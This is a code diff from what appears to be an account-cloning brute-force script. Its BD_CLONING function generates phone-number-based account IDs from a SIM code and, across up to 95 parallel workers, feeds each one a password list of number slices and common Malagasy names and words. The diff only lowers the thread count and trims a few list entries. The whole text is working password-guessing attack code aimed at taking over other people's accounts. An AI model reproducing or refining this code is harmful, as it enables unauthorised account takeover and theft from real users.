@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=100) as Dipto:
+    with tred(max_workers=95) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:],'amboara','Amboara','sarindra','narovana','nilaina','nomena','tsilavina','Tsilavina','mamako','vadiko','tolotra','Randria','nirina','Nirina','fitiavana','Fitiavana','fanantenana','Fanantenana','miangola','Miangola','fahendrena','Fahendrena','miangaly','Miangaly','nantenaina','Nantenaina','malala','Malala','razafy','Razafy','tantely','mendrika','mahery','Mahery','Mendrika','fandresena','fahendrena','fiderana','Fiderana','finoana','Finoana','nilaina','notiavina','deraina','Deraina','tiavina','Tiavina','josephine','Josephine','rakoto','Rakoto','valala','Valala','sandratra','Sandratra','sambatra','sambatra','noharina','Noharina','kaleba','Kaleba','milely','Milely','tahiry','Tahiry','anjara','Anjara','volana','Volana','herman','Herman','parfait','Parfait','safidinirina','Safidinirina','Olivier','olivier','nasandratra','Nasandratra','olivia','Olivia','nomena','Nomena','jesosy','Jesosy','Jehovah','jehovah','andriamanitra','Andriamanitra','ambohipo','Ambohipo','katolika','Katolika','salohy','Salohy','solofo','Solofo','randria','narovana','Narovana','nilaina','Nilaina']
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:],'amboara','Amboara','sarindra','narovana','nilaina','nomena','tsilavina','Tsilavina','mamako','vadiko','tolotra','Randria','nirina','Nirina','fitiavana','Fitiavana','fanantenana','Fanantenana','miangola','fahendrena','miangaly','nantenaina','Nantenaina','malala','Malala','razafy','Razafy','tantely','mendrika','mahery','Mahery','Mendrika','fandresena','fahendrena','fiderana','finoana','nilaina','notiavina','deraina','Deraina','tiavina','Tiavina','josephine','Josephine','rakoto','Rakoto','valala','Valala','sandratra','Sandratra','sambatra','sambatra','noharina','Noharina','kaleba','Kaleba','milely','Milely','tahiry','Tahiry','anjara','Anjara','volana','Volana','herman','Herman','parfait','Parfait','safidinirina','Safidinirina','Olivier','olivier','nasandratra','Nasandratra','olivia','Olivia','nomena','Nomena','jesosy','Jesosy','Jehovah','jehovah','andriamanitra','Andriamanitra','ambohipo','Ambohipo','katolika','Katolika','salohy','Salohy','solofo','Solofo','randria','narovana','Narovana','nilaina','Nilaina']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
